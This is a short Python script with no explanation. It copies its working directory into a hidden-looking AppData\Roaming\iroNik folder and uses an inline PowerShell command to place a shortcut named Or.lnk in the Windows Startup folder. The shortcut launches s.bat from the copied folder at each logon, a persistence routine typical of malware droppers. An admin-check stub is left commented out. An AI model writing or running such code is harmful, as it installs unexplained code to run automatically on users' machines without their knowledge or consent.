import subprocess
#import ctypes, sys
import os
import shutil
from pathlib import Path

def is_admin():
    try:
        #return ctypes.windll.shell32.IsUserAnAdmin()
        pass
    except:
        return False
shutil.copytree(os.getcwd(), Path.home().joinpath( 'AppData', 'Roaming' ,'iroNik' ))
subprocess.run(f"powershell \"$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\\Start Menu\\Programs\\Startup\\Or.lnk');$s.TargetPath='{Path.home().joinpath( 'AppData', 'Roaming' ,'iroNik' )}\\s.bat';$s.Save()\"", shell=True)